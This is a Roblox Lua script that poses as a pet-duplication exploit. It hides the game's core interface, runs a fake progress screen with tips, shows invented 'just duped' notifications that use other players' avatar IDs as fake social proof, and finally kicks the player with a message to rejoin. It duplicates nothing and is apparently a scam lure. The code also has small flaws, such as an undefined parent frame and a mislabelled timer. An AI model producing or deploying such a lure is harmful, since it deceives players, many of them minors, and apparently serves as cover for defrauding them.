local player = game.Players.LocalPlayer
local TweenService = game:GetService("TweenService")
local StarterGui = game:GetService("StarterGui")
local playerGui = player:WaitForChild("PlayerGui")

-- 🔒 Hide all Core Roblox UI
pcall(function()
	StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
	StarterGui:SetCore("TopbarEnabled", false)
end)

-- 💻 Create ScreenGui
local loadingGui = Instance.new("ScreenGui")
loadingGui.Name = "LoadingScreen"
loadingGui.IgnoreGuiInset = true
loadingGui.ResetOnSpawn = false
loadingGui.DisplayOrder = 1000
loadingGui.Parent = playerGui

-- 🕶️ Fullscreen black base
local blackBase = Instance.new("Frame")
blackBase.Size = UDim2.new(1, 0, 1, 0)
blackBase.Position = UDim2.new(0, 0, 0, 0)
blackBase.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
blackBase.BorderSizePixel = 0
blackBase.ZIndex = 1
blackBase.Parent = loadingGui

-- 🖼️ Fullscreen Background Image
local bgImage = Instance.new("ImageLabel")
bgImage.Size = UDim2.new(1, 0, 1, 0)
bgImage.Position = UDim2.new(0, 0, 0, 0)
bgImage.Image = "rbxassetid://90556697972283"
bgImage.BackgroundTransparency = 1
bgImage.ScaleType = Enum.ScaleType.Crop
bgImage.ZIndex = 2
bgImage.Parent = loadingGui

-- 🌱 Title
local title = Instance.new("TextLabel")
title.AnchorPoint = Vector2.new(0.5, 0)
title.Position = UDim2.new(0.5, 0, 0.4, 0)
title.Size = UDim2.new(0.8, 0, 0, 30)
title.BackgroundTransparency = 1
title.Text = "Duplicating Pets..."
title.TextColor3 = Color3.fromRGB(180, 240, 180)
title.Font = Enum.Font.GothamBold
title.TextSize = 22
title.TextTransparency = 1
title.ZIndex = 2
title.Parent = loadingGui
TweenService:Create(title, TweenInfo.new(1), {TextTransparency = 0}):Play()

-- 📜 Supported Pets Info
local info = Instance.new("TextLabel")
info.AnchorPoint = Vector2.new(0.5, 0)
info.Position = UDim2.new(0.5, 0, 0.44, 30)
info.Size = UDim2.new(0.9, 0, 0, 24)
info.BackgroundTransparency = 1
info.Text = "Only Works On: BUTTERFLY, DRAGONFLY, RACCOON, REDFOX, MIMIC OCTOPUS, QUEEN BEE, DISCO BEE"
info.TextColor3 = Color3.fromRGB(255, 220, 180)
info.Font = Enum.Font.GothamMedium
info.TextSize = 14
info.TextWrapped = true
info.ZIndex = 2
info.Parent = loadingGui
TweenService:Create(info, TweenInfo.new(1), {TextTransparency = 0}):Play()

-- 📊 Progress Bar
local barBg = Instance.new("Frame")
barBg.AnchorPoint = Vector2.new(0.5, 0)
barBg.Position = UDim2.new(0.5, 0, 0.5, 30)
barBg.Size = UDim2.new(0, 300, 0, 24)
barBg.BackgroundColor3 = Color3.fromRGB(40, 60, 40)
barBg.BorderSizePixel = 0
barBg.ZIndex = 2
barBg.Parent = loadingGui
Instance.new("UICorner", barBg).CornerRadius = UDim.new(0, 12)

local barFill = Instance.new("Frame")
barFill.Size = UDim2.new(0, 0, 1, 0)
barFill.BackgroundColor3 = Color3.fromRGB(100, 255, 120)
barFill.ZIndex = 3
barFill.Parent = barBg
Instance.new("UICorner", barFill).CornerRadius = UDim.new(0, 12)

-- Percentage Label
local percent = Instance.new("TextLabel")
percent.AnchorPoint = Vector2.new(0.5, 0)
percent.Position = UDim2.new(0.5, 0, 0.5, 60)
percent.Size = UDim2.new(0, 100, 0, 24)
percent.BackgroundTransparency = 1
percent.Text = "0%"
percent.TextColor3 = Color3.fromRGB(180, 240, 180)
percent.Font = Enum.Font.GothamBold
percent.TextSize = 18
percent.TextTransparency = 1
percent.ZIndex = 2
percent.Parent = loadingGui
TweenService:Create(percent, TweenInfo.new(1), {TextTransparency = 0}):Play()

local tips = {
    "Make sure you're holding the pet before duping!",
    "Only works in public servers.",
    "Avoid leaving immediately after duping!",
    "Dupe Raccoon or Red Fox for highest chance.",
    "The higher the delay, the safer the dupe!",
    "Check your backpack after rejoining!",
    "Disco Bee is rare — use it wisely.",
    "Don’t unequip pets during the process!",
    "Red Fox is the easiest pet to duplicate!",
    "Butterfly and Dragonfly are decent for bulk dupes.",
    "Use the SAVE button after duping to lock pets!"
}

local tipLabel = Instance.new("TextLabel")
tipLabel.Size = UDim2.new(1, 0, 0, 22)
tipLabel.Position = UDim2.new(0, 0, 0.5, 90)
tipLabel.BackgroundTransparency = 1
tipLabel.Text = "💡 TIP: " .. tips[1]
tipLabel.TextColor3 = Color3.fromRGB(180, 255, 180)
tipLabel.Font = Enum.Font.Gotham
tipLabel.TextSize = 14
tipLabel.TextTransparency = 1
tipLabel.Parent = loadingFrame
TweenService:Create(tipLabel, TweenInfo.new(1), {TextTransparency = 0}):Play()

-- 🎲 Randomize tip every 15–30 seconds
task.spawn(function()
	while true do
		task.wait(math.random(15, 30))
		tipLabel.Text = "💡 TIP: " .. tips[math.random(1, #tips)]
	end
end)

local Players = game:GetService("Players")
local thumbType = Enum.ThumbnailType.HeadShot
local thumbSize = Enum.ThumbnailSize.Size100x100

-- 🔠 Expanded fake usernames and mapped UserIds for avatars
local fakeUsers = {
    {name = "ProfessorXQueen", id = 2416293142},
    {name = "Faze_sv3n1", id = 3553493535},
    {name = "huge_collector202", id = 1193281055},
    {name = "Yey012733", id = 951139159},
    {name = "Giantmonstervinnie3", id = 2064910834},
    {name = "Junior7770m", id = 2950171783},
    {name = "sucaboy202829", id = 1886355952},
    {name = "Elliot3229", id = 1321981294},
    {name = "stankybahlz", id = 1051965},
    {name = "LilRavioliiii", id = 1568979291},
    {name = "Aquaz_233", id = 1243698095},
    {name = "Velvethop66", id = 2231982101},
    {name = "Ravage91101", id = 3086710497},
    {name = "Quantum_Xeno", id = 103246224},
    {name = "PixelPup99", id = 1835681239},
    {name = "BeeMaster456", id = 48263834},
    {name = "ToxicBloom", id = 1711446739},
    {name = "KingSlayerBee", id = 2542699892},
    {name = "SnailGod707", id = 1273486198},
    {name = "RainbowSeedr", id = 2573491664},
    {name = "TheFarmingFool", id = 1425683314},
    {name = "BigBagsBee", id = 3995192349},
    {name = "DUPERX9", id = 883742915},
    {name = "ClipClopBee", id = 2299198249},
    {name = "YuraBee", id = 2357819433},
    {name = "MegaFox246", id = 1562180924},
    {name = "BotanicalBoyz", id = 140279631},
    {name = "BloomCraze", id = 1371468363},
    {name = "PetPopper", id = 162459109},
    {name = "DupestationX", id = 3051512616},
    {name = "LeafyDoom", id = 1995198094},
    {name = "GagsterFX", id = 2791891011},
    {name = "GlitchedPlantz", id = 1589331993},
    {name = "ReplantRuler", id = 4476123721},
    {name = "BountyBloom", id = 3006710933},
    {name = "FoxieShines", id = 1020919834},
    {name = "MimicMayhem", id = 3189910240},
    {name = "NightBee777", id = 1742916034},
    {name = "BuzzedMaster", id = 2201938190},
    {name = "TheRootedOne", id = 1184410972}
}

-- 🔁 Templates with just “just duped” and “duplicated”
local notificationTemplates = {
    "just duped Raccoon x2",
    "duplicated Queen Bee x1",
    "just duped Disco Bee x3",
    "duplicated Mimic Octopus x2",
    "duplicated Dragonfly x2",
    "just duped Butterfly x5",
    "duplicated Red Fox x3",
    "just duped Queen Bee x3",
    "duplicated Raccoon x1",
    "just duped Red Fox x2",
    "duplicated Disco Bee x4",
    "duplicated Butterfly x1",
    "just duped Dragonfly x3",
    "just duped Mimic Octopus x1"
}

-- 🔊 Notification sound
local notificationSound = Instance.new("Sound")
notificationSound.SoundId = "rbxassetid://12222030"
notificationSound.Volume = 1
notificationSound.Name = "NotificationSound"
notificationSound.Parent = game:GetService("SoundService")

-- ⏱️ Notifications run for 10 minutes max
task.spawn(function()
    local totalTime = 0
    local maxTime = 600 -- 10 minutes
    while totalTime < maxTime do
        local delayTime = math.random(1, 30)
        task.wait(delayTime)
        totalTime += delayTime

        local user = fakeUsers[math.random(#fakeUsers)]
        local msg = user.name .. " " .. notificationTemplates[math.random(#notificationTemplates)]
        local iconUrl = "rbxthumb://type=AvatarHeadShot&id=" .. user.id .. "&w=100&h=100"

        pcall(function()
            notificationSound:Play()
            game.StarterGui:SetCore("SendNotification", {
                Title = "Dupe Tracker",
                Text = msg,
                Icon = iconUrl,
                Duration = 10
            })
        end)
    end
end)


-- 🔁 Animate Loading (10 minutes)
local duration = 300 -- 10 minutes
local steps = 100
for i = 1, steps do
	local t = i / steps
	barFill.Size = UDim2.new(t, 0, 1, 0)
	percent.Text = math.floor(t * 100) .. "%"
	task.wait(duration / steps)
end

percent.Text = "100%"
task.wait(0.5)

-- 🔄 Kick with info message
player:Kick("Rejoin to check your DUPLICATED pets!\n\nOnly Works On: BUTTERFLY, DRAGONFLY, RACCOON, REDFOX, MIMIC OCTOPUS, QUEEN BEE, DISCO BEE")
